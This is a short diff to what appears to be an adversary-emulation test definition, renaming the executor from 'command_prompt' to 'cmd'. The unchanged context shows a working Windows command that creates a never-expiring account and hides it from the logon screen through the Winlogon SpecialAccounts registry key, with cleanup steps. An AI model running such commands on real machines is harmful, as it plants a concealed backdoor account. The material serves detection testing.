@@ -25,9 +25,9 @@ requirements:
 steps:
     - name: create-hidden-user-in-registry
       inline: "NET USER {{.Args.user_name}}$ {{.Args.user_password}} /ADD /expires:never \nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v {{.Args.user_name}}$ /t REG_DWORD /d 0\n"
-      executor: command_prompt
+      executor: cmd
       cleanup:
         inline: |
             reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v {{.Args.user_name}}$ /f >nul 2>&1
             net user ${user_name}$ /delete >nul 2>&1
-        executor: command_prompt
+        executor: cmd
